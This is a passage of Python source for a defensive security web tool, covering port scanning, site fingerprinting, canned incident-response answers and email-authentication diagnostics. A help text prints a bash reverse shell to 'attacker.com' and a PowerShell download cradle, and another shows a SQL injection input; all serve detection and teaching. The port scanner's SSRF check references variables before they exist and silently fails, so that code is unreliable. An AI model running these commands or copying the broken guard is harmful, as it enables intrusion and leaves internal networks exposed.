    # Defense: Forbid scanning localhost or private addresses
    try:
        ip_obj = ipaddress.ip_address(ip)
        if ip_obj.is_loopback or ip_obj.is_private or ip_obj.is_link_local or ip_obj.is_multicast or ip_obj.is_reserved:
            return {
                "ip": ip,
                "hostname": "Protected Internal / Local Address",
                "asn_info": "Blocked: Private / Loopback IP (SSRF Protection)",
                "open_ports": [],
                "closed_ports": [{"port": p, "name": port_names.get(p, "Custom"), "reason": "Internal IP scanning forbidden"} for p in ports_to_check],
                "error": "Scanning internal, local, or loopback network addresses is forbidden."
            }
    except Exception:
        pass

    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
    except Exception:
        hostname = "No PTR reverse DNS record found"

    ports_to_check = [80, 443, 21, 22, 25, 53, 8080, 3389, 8443, 3306]
    port_names = {
        80: "HTTP (Web)", 443: "HTTPS (Secure Web)", 21: "FTP", 22: "SSH Remote Shell",
        25: "SMTP (Mail)", 53: "DNS", 8080: "HTTP Alt / Proxy", 3389: "RDP Remote Desktop",
        8443: "HTTPS Alt", 3306: "MySQL Database"
    }
    open_ports = []
    closed_ports = []

    for port in ports_to_check:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                res = s.connect_ex((ip, port))
                if res == 0:
                    open_ports.append({"port": port, "service": port_names.get(port, "Unknown")})
                else:
                    closed_ports.append(port)
        except Exception:
            closed_ports.append(port)

    is_private = ip.startswith(("10.", "172.16.", "192.168.", "127.", "169.254."))
    ip_type = "Private / Local Area Network" if is_private else "Public Routable IPv4"

    asn_info = "Autonomous System / ISP"
    if ip.startswith("1.1.1.") or ip.startswith("1.0.0.") or ip.startswith("162.158."):
        asn_info = "AS13335 Cloudflare, Inc."
    elif ip.startswith("8.8.8.") or ip.startswith("8.8.4."):
        asn_info = "AS15169 Google LLC"
    elif ip.startswith("20.") or ip.startswith("52."):
        asn_info = "AS8075 Microsoft Corporation"
    elif is_private:
        asn_info = "RFC 1918 Private Intranet"

    return {
        "target": target,
        "ip": ip,
        "hostname": hostname,
        "ip_type": ip_type,
        "asn_info": asn_info,
        "open_ports": open_ports,
        "closed_ports": closed_ports,
        "checked_ports": ports_to_check
    }

# ------------------------------------------------------------
# MODULE 9: TECHNOLOGY FINGERPRINTING
# ------------------------------------------------------------

def inspect_technology_fingerprint(target_input):
    clean = target_input.strip()
    if not clean:
        return {"error": "Please enter a website URL or domain."}
    
    parsed = urllib.parse.urlparse(clean if "://" in clean else "https://" + clean)
    host = parsed.netloc.lower().split(":")[0]
    scheme = parsed.scheme.lower() or "https"
    target_url = f"{scheme}://{host}"

    tech_stack = {
        "web_server": "Unknown",
        "cdn_security": "None detected",
        "cms": "None detected",
        "frameworks": [],
        "programming_language": "Unknown",
        "headers": {}
    }

    is_safe, safe_reason = is_safe_public_url(target_url)
    if not is_safe:
        tech_stack["web_server"] = f"Blocked: {safe_reason}"
        return tech_stack

    try:
        req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0 BehindUrDigitalLife/6.0"})
        ctx = get_doh_ssl_context()
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            headers = dict(resp.headers)
            tech_stack["headers"] = headers

            server = headers.get("Server", "")
            tech_stack["web_server"] = server or "Hidden / Undisclosed"

            if "cloudflare" in server.lower() or "cf-ray" in headers:
                tech_stack["cdn_security"] = "Cloudflare Global Anycast Edge & WAF"
            elif "akamai" in server.lower() or "x-akamai-transformed" in headers:
                tech_stack["cdn_security"] = "Akamai Intelligent Edge CDN"
            elif "cloudfront" in headers.get("x-cache", "").lower():
                tech_stack["cdn_security"] = "Amazon CloudFront CDN"
            elif "fastly" in headers.get("x-served-by", "").lower():
                tech_stack["cdn_security"] = "Fastly Edge Cloud"

            powered = headers.get("X-Powered-By", "")
            if "php" in powered.lower():
                tech_stack["programming_language"] = f"PHP ({powered})"
            elif "asp.net" in powered.lower():
                tech_stack["programming_language"] = "Microsoft ASP.NET"
            elif "express" in powered.lower():
                tech_stack["programming_language"] = "Node.js (Express)"
            elif "python" in powered.lower():
                tech_stack["programming_language"] = "Python (WSGI/ASGI)"

            html_body = resp.read(30000).decode("utf-8", errors="ignore").lower()
            if "wp-content" in html_body or "wp-includes" in html_body:
                tech_stack["cms"] = "WordPress"
            elif "shopify.com" in html_body or "cdn.shopify.com" in html_body:
                tech_stack["cms"] = "Shopify eCommerce"
            elif "drupal" in html_body or "drupal.settings" in html_body:
                tech_stack["cms"] = "Drupal CMS"
            elif "joomla" in html_body:
                tech_stack["cms"] = "Joomla"
            elif "wix.com" in html_body:
                tech_stack["cms"] = "Wix Site Builder"

            if "react" in html_body or "_next" in html_body:
                tech_stack["frameworks"].append("React / Next.js")
            if "vue" in html_body or "nuxt" in html_body:
                tech_stack["frameworks"].append("Vue.js / Nuxt")
            if "bootstrap" in html_body:
                tech_stack["frameworks"].append("Bootstrap CSS")
            if "tailwind" in html_body:
                tech_stack["frameworks"].append("Tailwind CSS")
            if "jquery" in html_body:
                tech_stack["frameworks"].append("jQuery")

    except Exception as e:
        tech_stack["fetch_error"] = str(e)

    return tech_stack

# ------------------------------------------------------------
# MODULE 10: AI CYBERSECURITY COPILOT (CHATBOT ENGINE)
# ------------------------------------------------------------

def ai_chat_assistant(question):
    """
    Context-aware AI security assistant.
    Routes to 20+ specialized knowledge bases based on detected topic.
    Returns specific, accurate, actionable cybersecurity guidance.
    """
    if not question or not question.strip():
        return "Please type a cybersecurity question. I can help with ransomware, phishing, DMARC, passwords, steganography, reverse shells, data breaches, WiFi security, OSINT, and more."

    q = question.lower().strip()

    # RANSOMWARE
    if any(w in q for w in ['ransomware', 'encrypted files', 'ransom note', 'locked files', '.locked', '.crypted', 'decrypt', 'files encrypted']):
        return """RANSOMWARE INCIDENT RESPONSE
=====================================
Your question: """ + question + """

IMMEDIATE ACTIONS (first 5 minutes):
1. DISCONNECT FROM NETWORK — unplug ethernet + disable WiFi. Do NOT shut down.
2. Photograph the ransom note. Save the file extension used on encrypted files.
3. Identify ransomware family at: https://id-ransomware.malwarehunterteam.com
4. Run: vssadmin list shadows — check if shadow copies still exist.
5. Isolate ALL machines on the same network segment.

DO NOT:
✗ Pay the ransom (no guarantee of decryption)
✗ Reboot or power off (clears RAM-resident decryption keys)
✗ Delete encrypted files (a free decryptor may be released later)
✗ Run antivirus yet (corrupts forensic evidence)

FREE DECRYPTORS:
• No More Ransom: https://www.nomoreransom.org/en/decryption-tools.html
• ID Ransomware: https://id-ransomware.malwarehunterteam.com
• Emsisoft: https://www.emsisoft.com/ransomware-decryption-tools/

RECOVERY PATH:
1. Restore from offline/immutable backup (3-2-1 rule)
2. If no backup: rebuild from scratch
3. Report to FBI IC3: https://www.ic3.gov

PREVENTION FOR FUTURE:
• Offline immutable backups (air-gapped drives)
• PowerShell Constrained Language Mode
• EDR with behavioral detection (CrowdStrike, SentinelOne)
• Segment Active Directory with Tiered Admin Model"""

    # PHISHING
    elif any(w in q for w in ['phishing', 'suspicious link', 'clicked a link', 'suspicious email', 'clicked link', 'fake email', 'suspicious message']):
        return """PHISHING ATTACK RESPONSE
=====================================
Your question: """ + question + """

IF YOU CLICKED A SUSPICIOUS LINK:
1. Disconnect from internet IMMEDIATELY if you entered credentials.
2. Change the exposed password NOW from a different clean device.
3. Enable Two-Factor Authentication on the affected account.
4. Check "Recent Activity" / "Active Sessions" for unauthorized logins.
5. Scan the URL: https://www.virustotal.com and https://urlscan.io

HOW TO IDENTIFY PHISHING:
✓ Mismatched sender domain (support@g00gle.com vs google.com)
✓ Urgency: "Act now!", "Your account will be closed in 24h"
✓ Dangerous attachments: .exe, .zip, .docm, .xlsm, .lnk
✓ Link text doesn't match actual URL (hover to check)
✓ Generic greeting: "Dear Customer" instead of your name
✓ Requests for passwords, OTPs, or card numbers via email

TECHNICAL INDICATORS:
• SPF/DMARC failures (check with our Email Security tab)
• URL shorteners hiding the real destination
• Punycode domains: pаypal.com (Cyrillic 'a')
• Domain registered < 30 days ago

Use our Website & URL Phishing tab to analyze any suspicious link."""

    # PASSWORD / BREACH
    elif any(w in q for w in ['password', 'breach', 'leaked', 'hacked account', 'data breach', 'credentials stolen', 'my password']):
        return """PASSWORD & BREACH RESPONSE
=====================================
Your question: """ + question + """

IF YOUR PASSWORD WAS LEAKED:
1. Change it IMMEDIATELY on ALL sites where you used it.
2. Enable 2FA/MFA on every important account.
3. Check breach status: https://haveibeenpwned.com
4. Check dark web: https://xposedornot.com
5. Enable login alerts on your accounts.

CREATING A STRONG PASSWORD:
✓ Minimum 16 characters (20+ recommended)
✓ Mix uppercase, lowercase, numbers, symbols
✓ Use a passphrase: "Tr0pical-Hurricane$17-Cyber!"
✓ Never reuse passwords across sites
✓ Password manager: Bitwarden (free), 1Password, KeePass

WHAT ATTACKERS DO WITH STOLEN PASSWORDS:
• Credential stuffing: try your combo on 200+ other websites
• Account takeover: hijack email to reset all other accounts
• Sell credentials on dark web ($1-$50 per account)

Use our Password Strength Analyzer tab to test any password."""

    # DMARC / SPF / EMAIL AUTH
    elif any(w in q for w in ['dmarc', 'spf', 'email spoofing', 'dkim', 'email authentication', 'mail security', 'domain spoofing']):
        return """EMAIL AUTHENTICATION: SPF, DKIM & DMARC
=====================================
Your question: """ + question + """

WHAT EACH RECORD DOES:
SPF — Publishes which IPs can send email for your domain.
  TXT at domain root: v=spf1 include:_spf.google.com -all

DKIM — Cryptographically signs outgoing email for authenticity.
  TXT at selector._domainkey.yourdomain.com

DMARC — Instructs receivers what to do when SPF/DKIM fails.
  TXT at _dmarc.yourdomain.com
  Policies: p=none (monitor), p=quarantine (spam), p=reject (block)

RECOMMENDED SETUP ORDER:
1. Enable DKIM in your email provider
2. Publish SPF: v=spf1 include:[provider] -all
3. Start DMARC at p=none with rua= reporting address
4. Review aggregate reports for 2-4 weeks
5. Move to p=quarantine then p=reject

Check your domain instantly with our Email Security Analyzer tab."""

    # STEGANOGRAPHY
    elif any(w in q for w in ['steganography', 'stego', 'hidden in image', 'image hiding', 'hidden message', 'hidden data']):
        return """STEGANOGRAPHY EXPLAINED
=====================================
Your question: """ + question + """

WHAT IS STEGANOGRAPHY?
Hiding secret data INSIDE ordinary files (images, audio, video)
so it's invisible to the naked eye. Unlike encryption (which hides
WHAT the message says), steganography hides that a message EXISTS.

HOW ATTACKERS USE IT:
• Polyglot files: an image that is ALSO a valid PHP/ZIP/EXE file
• Appended data: malware hidden after JPEG EOF marker (0xFFD9)
• LSB encoding: secret bits in least-significant pixel bits
• EXIF injection: PHP/JS code injected into camera metadata fields
• C2 communication: malware downloads "photos" containing commands

DETECTION:
• Check bytes after EOF (JPEG: 0xFFD9, PNG: IEND chunk)
• Shannon entropy > 7.5/8.0 = encrypted/compressed payload
• Compare actual file size vs. expected size for resolution
• Read EXIF metadata for script-like strings
• Magic bytes vs. extension mismatch

Use our Reverse Image & Stego tab to analyze any image."""

    # REVERSE SHELL / MALWARE
    elif any(w in q for w in ['reverse shell', 'malware', 'backdoor', 'trojan', 'rat', 'remote access tool', 'webshell', 'payload', 'shellcode']):
        return """MALWARE & REVERSE SHELL ANALYSIS
=====================================
Your question: """ + question + """

WHAT IS A REVERSE SHELL?
A reverse shell makes the VICTIM machine call OUT to the attacker
(bypassing firewalls since outbound traffic is usually allowed).

CLASSIC EXAMPLES:
Bash:       bash -i >& /dev/tcp/attacker.com/4444 0>&1
Python:     python3 -c 'import socket,subprocess,os; ...'
PowerShell: IEX (New-Object Net.WebClient).DownloadString("...")

HOW TO DETECT IT IN CODE:
• /dev/tcp/ references in scripts
• socket.connect() followed by os.dup2() calls
• subprocess.Popen() piped to a network socket
• IEX or Invoke-Expression with base64-encoded arguments
• os.system() with dynamic string building

IF YOU FOUND SUSPICIOUS CODE:
1. Do NOT execute it — static analysis only
2. Upload to our Malicious Code Analyzer tab
3. Check hash at: https://www.virustotal.com
4. Sandbox: https://any.run or https://app.hybrid-analysis.com
5. Block outbound connections from the affected system"""

    # IP ADDRESS
    elif any(w in q for w in ['ip address', 'ip tracking', 'my ip', 'trace ip', 'ip location', 'who owns this ip', 'blacklisted ip']):
        return """IP ADDRESS INTELLIGENCE
=====================================
Your question: """ + question + """

WHAT YOUR IP REVEALS:
• Country and approximate city (within ~50km typically)
• Internet Service Provider (ISP) name
• Whether you use VPN, Tor, proxy, or datacenter IP
• ASN (Autonomous System Number) — your network identity
• Reverse DNS hostname

CHECK ANY IP:
• Your IP: https://whatismyipaddress.com
• IP reputation: Use our IP Intelligence & Ports tab
• Abuse reports: https://www.abuseipdb.com
• Full WHOIS: https://ipinfo.io/[IP]

IF SOMEONE HAS YOUR IP:
• They see approximate location — NOT your exact address
• They can port scan your router
• Restart your router to get a new dynamic IP from ISP
• Use a VPN to hide your real IP

IP BLACKLIST CHECKING:
• https://mxtoolbox.com/blacklists.aspx
• https://www.dnsbl.info
• Check via our IP Intelligence tab"""

    # WIFI
    elif any(w in q for w in ['wifi', 'wireless', 'wpa', 'wep', 'router security', 'hotspot', 'evil twin', 'deauth', 'pmkid']):
        return """WIFI SECURITY ANALYSIS
=====================================
Your question: """ + question + """

WIFI PROTOCOL RANKING:
WEP       — BROKEN: Cracked in under 60 seconds
WPA/TKIP  — WEAK: PMKID attack cracks it without a client
WPA2-CCMP — Moderate: Safe with 20+ char passphrase only
WPA3-SAE  — BEST: Resistant to offline dictionary attacks

COMMON ATTACKS:
• Evil Twin: Fake AP with your SSID captures credentials
• PMKID: Crack WPA2 without needing connected client
• Deauth: Force reconnection and capture handshake
• WPS Brute Force: 8-digit PIN cracked in hours (Reaver)
• Karma Attack: Respond to all "preferred network" probes

HARDENING CHECKLIST:
✓ Use WPA3 if supported
✓ WiFi password: 20+ chars with all character types
✓ Disable WPS permanently
✓ Change default router admin credentials
✓ Separate guest network (different VLAN)
✓ Update router firmware
✓ Use VPN on public WiFi always

See our WiFi Security Audit tab for full protocol reference."""

    # APT / NATION STATE
    elif any(w in q for w in ['apt', 'nation state', 'advanced persistent', 'state sponsored', 'nation-state attack']):
        return """APT — ADVANCED PERSISTENT THREAT
=====================================
Your question: """ + question + """

WHAT IS AN APT?
Sophisticated, long-term attack campaigns by nation-state actors
targeting governments, defense, critical infrastructure, or high-value
corporations. APTs stay hidden for MONTHS OR YEARS.

CHARACTERISTICS:
• Persistence: remain undetected while continuously exfiltrating data
• Low-and-slow: minimal noise to avoid detection
• Zero-day exploits: use unpublished vulnerabilities
• Custom malware: purpose-built for the specific target

KNOWN APT GROUPS:
• APT28/Fancy Bear (Russia) — DNC hack, SolarWinds supply chain
• APT41 (China) — espionage + financial crime
• Lazarus Group (North Korea) — WannaCry, $600M Ronin Bridge
• OilRig/APT34 (Iran) — Middle East energy sector

DEFENSE:
• Zero Trust Architecture
• Network segmentation + east-west traffic monitoring
• Behavioral EDR (CrowdStrike, SentinelOne)
• MITRE ATT&CK framework for threat hunting
• Honeypots and honeytokens for deception

Use our Cyber Attack Triage tab → select APT for full response."""

    # WEBSITE LEGITIMACY
    elif any(w in q for w in ['legitimate', 'legit', 'scam', 'fake website', 'shopping website', 'real website', 'is this website safe', 'website safe']):
        return """WEBSITE LEGITIMACY CHECK
=====================================
Your question: """ + question + """

HOW TO VERIFY A WEBSITE:
1. Check HTTPS — but note: scam sites CAN have SSL certs too.
2. Verify domain age: https://whois.domaintools.com (< 30 days = red flag)
3. Check reviews: https://www.trustpilot.com and https://www.scamadviser.com
4. VirusTotal scan: https://www.virustotal.com/gui/url
5. URLScan analysis: https://urlscan.io

RED FLAGS FOR SCAM WEBSITES:
✗ Prices too good to be true (90% off brand products)
✗ No physical address or contact phone number
✗ Domain registered very recently (days or weeks ago)
✗ Poor grammar and spelling throughout site
✗ Only accepts crypto, wire transfers, or gift cards
✗ No return/refund policy or very vague one
✗ Domain is a slight misspelling of a real brand

LEGAL vs. ILLEGAL INDICATORS:
Illegal: selling counterfeit goods, phishing, fake storefronts,
unauthorized streaming, unlicensed financial services, crypto fraud.

Use our Website & URL Phishing tab for instant analysis."""

    # OSINT
    elif any(w in q for w in ['osint', 'find someone online', 'people search', 'track someone', 'find information about', 'open source intelligence']):
        return """OSINT — OPEN SOURCE INTELLIGENCE
=====================================
Your question: """ + question + """

WHAT IS OSINT?
Intelligence gathered from PUBLICLY AVAILABLE sources:
social media, public records, websites, search engines, databases.

KEY TECHNIQUES:
1. Google Dorking: site:linkedin.com "John Smith" "Delhi"
2. Username search: https://github.com/sherlock-project/sherlock
3. Email intel: https://epieos.com, https://hunter.io
4. Domain/IP: WHOIS, Shodan, SecurityTrails, crt.sh
5. Image reverse: Google Lens, TinEye, PimEyes (face search)
6. Archived pages: https://web.archive.org

COUNTER-OSINT (protect yourself):
• Set all social media to private
• Use different usernames per platform
• Remove EXIF metadata from photos before uploading
• Opt out of data broker sites (Spokeo, BeenVerified)
• Use P.O. Box for public registrations

See our OSINT & People Search tab for full toolkit.
⚠ LEGAL REMINDER: OSINT only on yourself or with permission."""

    # DARK WEB
    elif any(w in q for w in ['dark web', 'darkweb', 'tor network', 'onion site', '.onion']):
        return """DARK WEB INTELLIGENCE
=====================================
Your question: """ + question + """

WHAT IS THE DARK WEB?
Accessible only via Tor browser. Uses .onion domains not indexed
by search engines. Provides anonymity for both users and sites.

LAYERS OF THE INTERNET:
• Surface Web: sites indexed by Google (what everyone uses daily)
• Deep Web: login-protected content (email, banking, databases)
• Dark Web: Tor-only, unindexed, anonymous

WHAT'S SOLD ON DARK WEB:
• Stolen credentials (email+password combos)
• Compromised credit card data
• Personal identity information (SSNs, IDs)
• Ransomware-as-a-Service (RaaS) kits
• Zero-day exploits for sale

CHECK IF YOUR DATA IS EXPOSED:
• https://haveibeenpwned.com — free email breach check
• https://xposedornot.com — detailed breach timeline
• https://dehashed.com — deep credential search
• Use our Email Security Analyzer tab for breach lookup

PROTECTION:
• Unique passwords per site (one breach ≠ all accounts breached)
• 2FA everywhere — stolen password alone becomes useless
• Enable HaveIBeenPwned email notifications"""

    # HASH / CRYPTO
    elif any(w in q for w in ['hash', 'md5', 'sha256', 'sha-256', 'sha1', 'bcrypt', 'argon', 'encryption algorithm', 'identify hash']):
        return """CRYPTOGRAPHIC HASH ANALYSIS
=====================================
Your question: """ + question + """

IDENTIFY HASH BY LENGTH:
32 chars  → MD5 (BROKEN — cracked in seconds)
40 chars  → SHA-1 (WEAK — deprecated)
64 chars  → SHA-256 or BLAKE2s (STRONG)
128 chars → SHA-512 or BLAKE2b (VERY STRONG)
60 chars starting $2b$ → bcrypt (EXCELLENT for passwords)

SECURITY RANKING:
MD5     — BROKEN: collision attacks, rainbow tables
SHA-1   — WEAK: deprecated by all major CAs
SHA-256 — MODERATE: fine for file integrity, not passwords
bcrypt  — EXCELLENT: adaptive, designed for passwords
Argon2  — BEST: memory-hard, OWASP recommended
BLAKE3  — STRONG: modern, very fast, secure

FREE HASH LOOKUP:
• https://crackstation.net (MD5/SHA1/SHA256 — free)
• https://www.hashkiller.io
• https://hashes.com/en/decrypt/hash

See our Crypto & Hash Decoder tab for full reference."""

    # EMAIL HACKED
    elif any(w in q for w in ['email hacked', 'email compromised', 'account hacked', 'someone accessed my email', 'email account stolen']):
        return """EMAIL ACCOUNT COMPROMISED — RESPONSE
=====================================
Your question: """ + question + """

IMMEDIATE STEPS:
1. Log in and change your password NOW (from a different clean device).
2. Go to Security → "Active Sessions" — sign out ALL other sessions.
3. Enable Two-Factor Authentication (2FA) immediately.
4. Remove any unknown recovery email addresses or phone numbers.
5. Check mail FORWARDING RULES — attackers silently forward your mail.
6. Check "Sent" folder for emails you didn't write.

IF YOU LOST ACCESS:
• Gmail: https://accounts.google.com/signin/recovery
• Outlook: https://account.live.com/acsr
• Yahoo: https://help.yahoo.com/kb/SLN27051.html
Use your backup email, phone, or identity verification.

WHAT ATTACKERS DO WITH EMAIL ACCESS:
• Reset passwords on your bank, PayPal, Amazon
• Steal personal data from old emails
• Send phishing to your contacts pretending to be you

AFTER RECOVERY:
✓ Change passwords on ALL accounts linked to this email
✓ Check https://haveibeenpwned.com for breach history
✓ Enable login alerts for future access attempts"""

    # CATFISH / FAKE PROFILE
    elif any(w in q for w in ['catfish', 'fake profile', 'fake person', 'stolen photo', 'reverse image search', 'fake identity', 'is this person real']):
        return """CATFISH & FAKE IDENTITY DETECTION
=====================================
Your question: """ + question + """

REVERSE IMAGE SEARCH THEIR PHOTOS:
• Google Lens: https://lens.google.com (upload directly)
• TinEye: https://tineye.com (finds exact matches)
• Yandex Images: https://yandex.com/images (best for faces)
• PimEyes: https://pimeyes.com (face recognition search)

BEHAVIORAL RED FLAGS:
✗ Profile created very recently
✗ Very few mutual friends or followers
✗ Photos look professionally shot (stolen from a model)
✗ Refuses video calls or camera always "broken"
✗ Declares love very quickly
✗ Eventually asks for money (travel, medical, investment)
✗ Story has inconsistencies (job, location, family)
✗ Always has a reason they can't meet in person

TECHNICAL CHECKS:
• Check EXIF data on photos they send (GPS coordinates!)
• Use our Reverse Image & Stego tab to analyze photos
• Username tracker: https://github.com/sherlock-project/sherlock

HOW TO REPORT:
• Platform: Report the fake profile on the app/site
• India: https://cybercrime.gov.in
• US: https://www.ic3.gov"""

    # NETWORK SECURITY / PORT SCANNING
    elif any(w in q for w in ['port scan', 'open ports', 'network security', 'firewall', 'nmap', 'vulnerability scan']):
        return """NETWORK SECURITY & PORT ANALYSIS
=====================================
Your question: """ + question + """

DANGEROUS OPEN PORTS:
Port 21    — FTP (unencrypted, often targeted) — should be SFTP/22
Port 23    — Telnet (insecure) — CLOSE immediately
Port 3389  — RDP (Remote Desktop) — major brute force target
Port 3306  — MySQL — should NEVER be public
Port 6379  — Redis — often exposed without authentication
Port 27017 — MongoDB — often exposed without auth
Port 445   — SMB — WannaCry vector — block externally

PORT SECURITY CHECKLIST:
✓ Block all unnecessary ports at firewall level
✓ RDP: only via VPN with MFA, never directly exposed
✓ Databases: only accessible from application servers, not public
✓ Use fail2ban or similar for brute force protection
✓ Implement egress filtering (outbound traffic rules)

TOOLS FOR NETWORK SCANNING:
• Nmap: https://nmap.org (port scanner)
• Shodan: https://www.shodan.io (internet-wide scanner)
• Censys: https://censys.io (alternative to Shodan)
• MXToolbox: https://mxtoolbox.com (DNS + ports)

Use our IP Intelligence & Ports tab to scan any IP address."""

    # SQL INJECTION
    elif any(w in q for w in ['sql injection', 'sqli', 'database injection', 'union select', 'sqlmap']):
        return """SQL INJECTION EXPLAINED
=====================================
Your question: """ + question + """

WHAT IS SQL INJECTION?
When user input is concatenated directly into a database query
without sanitization, allowing attackers to inject SQL commands.

EXAMPLE — VULNERABLE CODE:
  query = "SELECT * FROM users WHERE id = " + user_input
  
  Attacker enters: 1 OR 1=1 --
  Resulting query: SELECT * FROM users WHERE id = 1 OR 1=1 --
  Result: Returns ALL users in the database

TYPES OF SQL INJECTION:
• Classic: Returns data directly in page response
• Blind: No visible error, but behavior changes
• Time-based: Uses SLEEP() to infer data
• UNION-based: Combines results from other tables
• Error-based: Exploits database error messages

SECURE CODE (PARAMETERIZED):
Python:  cursor.execute("SELECT * FROM t WHERE id = ?", (id,))
PHP:     $stmt = $pdo->prepare("SELECT ... WHERE id = ?"); $stmt->execute([$id]);
JS/Node: db.query("SELECT ... WHERE id = $1", [userId])

DETECTION TOOLS:
• SQLMap: https://sqlmap.org (automated detection)
• Burp Suite: https://portswigger.net/burp

Use our Malicious Code Analyzer tab to detect SQL injection in code."""

    # GENERAL FALLBACK
    else:
        # Extract keywords for context
        security_terms = ['xss', 'csrf', 'ssrf', 'rce', 'lfi', 'rfi', 'xxe', 'idor', 'clickjacking',
                         'man in the middle', 'mitm', 'dns', 'ssl', 'tls', 'certificate', 'jwt',
                         'oauth', 'api security', 'ddos', 'dos', 'botnet', 'cryptojacking', 'iot',
                         'supply chain', 'zero day', '0day', 'cve', 'vulnerability', 'exploit',
                         'penetration', 'pentest', 'ctf', 'forensics', 'incident response']
        
        found_terms = [t for t in security_terms if t in q]
        
        if found_terms:
            return """CYBERSECURITY INTELLIGENCE: """ + ", ".join(found_terms[:3]).upper() + """
=====================================
Your question: """ + question + """

I recognize your question is about: """ + ", ".join(found_terms) + """

For a detailed answer, please be more specific. For example:
• "What is """ + found_terms[0] + """ and how do I protect against it?"
• "How do attackers use """ + found_terms[0] + """?"
• "How to detect """ + found_terms[0] + """ in my code/server?"

GENERAL SECURITY RESOURCES:
• OWASP Top 10: https://owasp.org/www-project-top-ten/
• MITRE ATT&CK: https://attack.mitre.org
• NVD CVE Database: https://nvd.nist.gov
• NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
• Security Stack Exchange: https://security.stackexchange.com

AVAILABLE TOOLS ON THIS PLATFORM:
✓ Email Security Analyzer (SPF/DMARC/DKIM)
✓ Malicious Code Analyzer (reverse shells, SQLi, XSS)
✓ Reverse Image & Steganography Inspector
✓ URL & Phishing Analyzer
✓ IP Intelligence & Port Scanner
✓ Digital Forensic Toolkit
✓ Password Strength Analyzer
✓ OSINT & People Search (reference)
✓ Dark Web Monitor (reference)
✓ WiFi Security Audit (reference)"""

        else:
            return """ASK AI — CYBERSECURITY INTELLIGENCE
=====================================
Your question: """ + question + """

I can give specific answers on these topics — ask me directly:

INCIDENT RESPONSE:
  "My computer has ransomware, what do I do?"
  "I clicked a suspicious phishing link"
  "My email account was hacked"

SECURITY ANALYSIS:
  "How do I check if a website is legitimate or a scam?"
  "What is DMARC and how do I configure it?"
  "How do I detect a reverse shell in code?"

ATTACK UNDERSTANDING:
  "What is steganography and how do attackers use it?"
  "What is an APT / nation-state attack?"
  "How does a WiFi evil twin attack work?"

PRIVACY & SAFETY:
  "My password was found in a data breach"
  "How to detect a catfish or fake profile"
  "What is OSINT and how to protect yourself?"

TECHNICAL:
  "How to check if my IP is blacklisted?"
  "How to identify a hash type (MD5, SHA256)?"
  "What is SQL injection and how to prevent it?"

Please rephrase with specific details for a targeted answer."""


def build_diagnostics(result):
    diag = []
    domain = result["domain"]

    spf = result["spf"]
    if spf["status"] == "FAIL":
        diag.append({
            "status": "FAIL",
            "title": "SPF Authentication Missing / Failed",
            "source": f"TXT @{domain}",
            "layer": "DNS Layer (RFC 7208)",
            "why": f"No valid SPF TXT record was returned for '{domain}'. Sending mail servers cannot be verified.",
            "threat": "Anyone on the internet can spoof your domain name and send fake phishing emails claiming to be from your company.",
            "fix": f"Add a DNS TXT record at host '@' with: v=spf1 include:_spf.google.com ~all"
        })
    elif spf["status"] == "WARN":
        diag.append({
            "status": "WARN",
            "title": "SPF Weak Policy Configuration",
            "source": f"TXT @{domain}",
            "layer": "DNS Layer (RFC 7208)",
            "why": spf["details"],
            "threat": "A neutral or multiple SPF record allows unauthorized email servers to forge your identity without getting hard-blocked.",
            "fix": "Consolidate into exactly one SPF TXT record terminating with '~all' or '-all'."
        })
    else:
        diag.append({
            "status": "PASS",
            "title": "SPF Authentication Active",
            "source": f"TXT @{domain}",
            "layer": "DNS Layer",
            "why": spf["details"],
            "threat": "None detected. Authorized sending infrastructure is explicitly declared.",
            "fix": "SPF is properly configured."
        })

    dmarc = result["dmarc"]
    if dmarc["status"] == "FAIL":
        diag.append({
            "status": "FAIL",
            "title": "DMARC Policy Record Missing",
            "source": f"TXT _dmarc.{domain}",
            "layer": "Mail Security Layer (RFC 7489)",
            "why": f"DNS query for '_dmarc.{domain}' returned no records.",
            "threat": "Receiving servers have no instructions on how to handle spoofed emails, allowing forged messages to reach recipient inboxes.",
            "fix": f"Add a DNS TXT record at host '_dmarc' with: v=DMARC1; p=quarantine; pct=100; rua=mailto:admin@{domain}"
        })
    elif dmarc["status"] == "WARN":
        diag.append({
            "status": "WARN",
            "title": "DMARC Policy in Monitoring Mode (p=none)",
            "source": f"TXT _dmarc.{domain}",
            "layer": "Mail Security Layer",
            "why": "The DMARC policy is set to 'p=none' (or lacks aggregate reporting rua).",
            "threat": "Forged emails are logged but NOT blocked or moved to spam.",
            "fix": f"Upgrade policy to 'p=quarantine' or 'p=reject' in your _dmarc TXT record."
        })
    else:
        diag.append({
            "status": "PASS",
            "title": "DMARC Policy Enforcement Active",
            "source": f"TXT _dmarc.{domain}",
            "layer": "Mail Security Layer",
            "why": dmarc["details"],
            "threat": "None. Strict enforcement blocks or quarantines unauthorized spoofed emails.",
            "fix": "DMARC enforcement is healthy."
        })

    mx = result["mx"]
    if mx["status"] == "PASS":
        diag.append({
            "status": "PASS",
            "title": f"Mail Routing Configured ({mx['provider']})",
            "source": f"MX @{domain}",
            "layer": "Transport Routing Layer",
            "why": mx["details"],
            "threat": "None. Legitimate incoming mail exchanges are properly mapped.",
            "fix": "MX records are healthy."
        })
    else:
        diag.append({
            "status": "WARN",
            "title": "No MX Records Found",
            "source": f"MX @{domain}",
            "layer": "Transport Routing Layer",
            "why": mx["details"],
            "threat": "The domain cannot receive inbound email. Senders will receive delivery failure bounces.",
            "fix": f"Point MX records to your email service provider."
        })

    tls = result["tls"]
    diag.append({
        "status": tls["status"],
        "title": "Web Server SSL/TLS Certificate Status",
        "source": f"Port 443 @{domain}",
        "layer": "Encryption / Transport Security",
        "why": tls["details"],
        "threat": "Insecure connections expose credentials to eavesdropping." if tls["status"] != "PASS" else "None.",
        "fix": "Ensure automated Let's Encrypt or Cloudflare TLS renewal is active." if tls["status"] != "PASS" else "TLS certificate active."
    })

    return diag


def scan_domain(user_input):
    original, domain = normalize_input(user_input)

    spf = check_spf(domain)
    dmarc = check_dmarc(domain)
    mx = check_mx(domain)
    tls = check_tls(domain)
    breaches = check_breaches(original)

    score = calculate_score(spf, dmarc, mx, tls)
    risk, grade = get_risk_and_grade(score)

    scan_time = datetime.datetime.now().strftime("%b %d, %Y, %I:%M:%S %p")

    result = {
        "input": original,
        "domain": domain,
        "score": score,
        "risk": risk,
        "grade": grade,
